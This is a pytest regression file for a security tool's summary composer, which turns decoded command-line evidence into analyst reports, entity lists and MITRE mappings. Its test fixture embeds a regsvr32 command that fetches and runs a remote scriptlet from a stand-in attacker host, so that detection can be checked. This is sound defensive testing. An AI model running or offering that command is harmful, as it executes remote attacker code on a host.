"""ADR-0014 · Slice-D · Backend Summary Composer regression tests.

Locks the summary contract that the Lab 2.0 Workspace will consume.
"""
from __future__ import annotations

import pytest

from nivxforge.cim.fact_substrate import (
    DecoderLayer, FactSubstrate, IOCRecord, MITREHit, TIHitRecord,
)
from nivxforge.investigation import build_cio, validate_cio
from nivxforge.investigation.summary_composer import (
    compose_summary, Summary,
)


def _rich_substrate() -> FactSubstrate:
    return FactSubstrate(
        input_text=("host=AZG51 user=alice\n"
                    "regsvr32 /u /s /i:http://attacker.example.com/x.sct"),
        input_kind="cmd",
        source_endpoint="/api/decode/smart",
        decoder_chain=[
            DecoderLayer(idx=0, op="powershell-encoded", input_kind="b64",
                         output_kind="text",
                         output_preview="regsvr32 /u /s /i:http://attacker.example.com/x.sct"),
        ],
        iocs=[
            IOCRecord(kind="url", value="http://attacker.example.com/x.sct",
                      stage_passed=["syntactic", "context"]),
            IOCRecord(kind="ip", value="8.8.8.8", stage_passed=["syntactic"]),
            IOCRecord(kind="url", value="http://crl.verisign.com/x.crl",
                      stage_passed=["syntactic"]),  # vendor infra — should not appear in ext domains
        ],
        mitre_hits=[
            MITREHit(technique_id="T1218.010", name="Regsvr32", tactic="Defense Evasion"),
        ],
        ti_hits=[],
        reasoning_notes=["Signed-binary proxy execution via regsvr32 /i:http*"],
    )


def _benign_substrate() -> FactSubstrate:
    return FactSubstrate(
        input_text="benign log entry",
        input_kind="text",
        source_endpoint="/api/decode/smart",
        decoder_chain=[],
        iocs=[
            IOCRecord(kind="url", value="http://crl.verisign.com/x.crl",
                      stage_passed=["syntactic"]),
        ],
        mitre_hits=[],
        ti_hits=[],
        reasoning_notes=[],
    )


class TestSummaryShape:
    def test_summary_present_on_cio(self):
        cio = build_cio(_rich_substrate())
        assert cio.summary
        assert cio.summary["composer_version"] == "slice-d-v1"

    def test_summary_parses_as_pydantic_model(self):
        cio = build_cio(_rich_substrate())
        Summary.model_validate(cio.summary)

    def test_all_14_top_level_fields_present(self):
        cio = build_cio(_rich_substrate())
        expected = {
            "executive", "analyst", "technical", "attack_story",
            "key_findings", "unknowns", "recommendations", "confidence",
            "evidence_digest", "attack_chain", "entities_digest",
            "mitre_digest", "timeline_digest", "report_sections",
            "composer_version",
        }
        assert expected.issubset(set(cio.summary.keys()))


class TestEventFirstOrdering:
    """§1.1.18 · Event → Process Chain → Host/User → Timeline →
    High-confidence Evidence → Scope → Impact → Recommendations.

    The analyst prose MUST open with 'Event:' — never 'URL' or 'Hash'."""

    def test_analyst_prose_opens_with_event(self):
        cio = build_cio(_rich_substrate())
        analyst = cio.summary["analyst"]
        assert analyst.startswith("Event:"), \
            f"Analyst prose must open with 'Event:' (§1.1.18). Got: {analyst[:60]!r}"

    def test_analyst_prose_does_not_open_with_url(self):
        cio = build_cio(_rich_substrate())
        analyst = cio.summary["analyst"].lower()
        first_sentence = analyst.split(".")[0]
        # §1.1.18 · a *URL literal* must not appear in the opening
        # sentence. Rule text may legitimately mention protocol names.
        assert "http://" not in first_sentence, \
            "URL literal must not appear in the opening sentence (§1.1.18)"
        assert "https://" not in first_sentence

    def test_analyst_prose_does_not_open_with_hash(self):
        cio = build_cio(_rich_substrate())
        first_sentence = cio.summary["analyst"].split(".")[0].lower()
        for token in ("sha256", "md5", "sha1"):
            assert token not in first_sentence


class TestEntityDigest:
    def test_hosts_extracted_from_input(self):
        cio = build_cio(_rich_substrate())
        assert "AZG51" in cio.summary["entities_digest"]["hosts"]

    def test_users_extracted_from_input(self):
        cio = build_cio(_rich_substrate())
        assert "alice" in cio.summary["entities_digest"]["users"]

    def test_external_domain_present(self):
        cio = build_cio(_rich_substrate())
        assert "http://attacker.example.com/x.sct" in cio.summary["entities_digest"]["external_domains"]

    def test_ca_infra_not_in_external_domains(self):
        cio = build_cio(_rich_substrate())
        domains = cio.summary["entities_digest"]["external_domains"]
        for polluter in ["crl.verisign.com", "verisign.com"]:
            for d in domains:
                assert polluter not in d, f"Vendor/CA infra leaked: {d}"

    def test_lolbin_captured(self):
        cio = build_cio(_rich_substrate())
        assert "regsvr32" in cio.summary["entities_digest"]["lolbins"]


class TestAttackChain:
    def test_chain_present_and_ordered(self):
        cio = build_cio(_rich_substrate())
        chain = cio.summary["attack_chain"]
        assert chain
        orders = [step["order"] for step in chain]
        assert orders == sorted(orders)
        assert orders[0] == 1

    def test_verdict_last_in_chain(self):
        cio = build_cio(_rich_substrate())
        chain = cio.summary["attack_chain"]
        assert chain[-1]["label"].startswith("Verdict:")


class TestRecommendations:
    def test_recommendations_present(self):
        cio = build_cio(_rich_substrate())
        assert cio.summary["recommendations"]

    def test_priority_maps_to_verdict(self):
        cio = build_cio(_rich_substrate())
        verdict_label = cio.verdict["label"]
        top_priority = cio.summary["recommendations"][0]["priority"]
        expected = {
            "Malicious": "critical", "Suspicious": "high",
            "Runtime Dependent": "medium", "Informational": "low",
            "Undetermined": "informational",
        }
        assert top_priority == expected[verdict_label]


class TestConfidenceMirror:
    def test_summary_confidence_equals_verdict_confidence(self):
        cio = build_cio(_rich_substrate())
        assert cio.summary["confidence"] == pytest.approx(cio.verdict["confidence"], abs=1e-4)


class TestMitreDigest:
    def test_technique_present(self):
        cio = build_cio(_rich_substrate())
        md = cio.summary["mitre_digest"]
        assert md["coverage"] >= 1
        assert any(t["id"] == "T1218.010" for t in md["techniques"])


class TestReportSections:
    def test_all_four_sections_present(self):
        cio = build_cio(_rich_substrate())
        rs = cio.summary["report_sections"]
        for key in ("what_happened", "what_we_found",
                    "what_we_dont_know", "what_to_do"):
            assert key in rs


class TestDeterminism:
    def test_same_cio_same_summary(self):
        c1 = build_cio(_rich_substrate())
        c2 = build_cio(_rich_substrate())
        assert c1.summary == c2.summary


class TestBenignPath:
    def test_benign_infra_produces_informational(self):
        cio = build_cio(_benign_substrate())
        verdict = cio.verdict
        assert verdict["label"] in ("Informational", "Undetermined")
        recs = cio.summary["recommendations"]
        assert recs[0]["priority"] in ("low", "informational")

    def test_benign_no_external_domain_bleed(self):
        cio = build_cio(_benign_substrate())
        assert cio.summary["entities_digest"]["external_domains"] == []


class TestG1G2G4StillHold:
    def test_gates_still_pass_after_slice_d(self):
        cio = build_cio(_rich_substrate())
        validate_cio(cio)

    def test_metadata_reports_slice_d(self):
        cio = build_cio(_rich_substrate())
        assert cio.metadata["slice"] == "D"
